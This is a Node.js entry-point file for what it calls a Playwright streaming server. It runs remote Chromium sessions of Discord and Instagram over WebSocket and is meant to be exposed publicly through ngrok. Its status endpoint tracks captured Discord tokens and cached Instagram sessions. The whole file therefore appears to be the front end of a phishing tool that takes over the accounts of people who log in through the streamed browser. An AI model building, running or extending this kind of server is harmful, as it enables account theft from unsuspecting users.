#!/usr/bin/env node
// ══════════════════════════════════════════════════════════
// playwright-server.js — entry point
//
// Usage:
//   node playwright-server.js
//
// WebSocket:
//   ws://localhost:3000/stream?type=discord
//   ws://localhost:3000/stream?type=instagram
//
// Quick start:
//   bash contribute.sh
// ══════════════════════════════════════════════════════════

const http = require('http');
const { WebSocketServer } = require('ws');
const { SVC, launchBrowser, closeBrowser, DEFAULT_TIMEOUT_S, MAX_TABS, getActivePage } = require('./browser-manager');
const { initWebSocket } = require('./stream-handler');

const PORT = process.env.PORT || 3000;

// ── HTTP Server ───────────────────────────────────────────
const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

    if (req.url === '/status' && req.method === 'GET') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            ok: true,
            discord: {
                ready: !!getActivePage(SVC.discord),
                clients: SVC.discord.clients.size,
                captured: SVC.discord.tokenCaptured,
                hasCachedToken: !!SVC.discord.capturedToken,
                tabs: SVC.discord.pages.length
            },
            instagram: {
                ready: !!getActivePage(SVC.instagram),
                clients: SVC.instagram.clients.size,
                captured: SVC.instagram.tokenCaptured,
                hasCachedSession: !!SVC.instagram.capturedSession,
                tabs: SVC.instagram.pages.length
            }
        }));
        return;
    }

    res.writeHead(404); res.end('Not found');
});

// ── WebSocket Server ──────────────────────────────────────
const wss = new WebSocketServer({ server });
initWebSocket(wss);

// ── Start ─────────────────────────────────────────────────
server.listen(PORT, async () => {
    console.log(`\nPlaywright streaming server on port ${PORT}`);
    console.log(`  Discord   → ws://localhost:${PORT}/stream?type=discord`);
    console.log(`  Instagram → ws://localhost:${PORT}/stream?type=instagram`);
    console.log(`  Status    → http://localhost:${PORT}/status`);
    console.log(`  Timeout   → ${DEFAULT_TIMEOUT_S}s (configurable per client)`);
    console.log(`  Max tabs  → ${MAX_TABS} per service`);
    console.log(`\nExpose with: ngrok http ${PORT}\n`);

    const results = await Promise.allSettled([
        launchBrowser('discord'),
        launchBrowser('instagram')
    ]);

    for (const [i, r] of results.entries()) {
        const name = i === 0 ? 'discord' : 'instagram';
        if (r.status === 'rejected') {
            const msg = r.reason?.message || '';
            if (msg.includes("Executable doesn't exist")) {
                console.error(`\nChromium not installed. Run: npx playwright install chromium`);
                process.exit(1);
            }
            console.error(`[${name}] Failed to launch:`, msg);
        }
    }
});

process.on('SIGINT', async () => {
    console.log('\nShutting down...');
    await Promise.allSettled([
        closeBrowser(SVC.discord, 'discord'),
        closeBrowser(SVC.instagram, 'instagram')
    ]);
    server.close();
    process.exit(0);
});
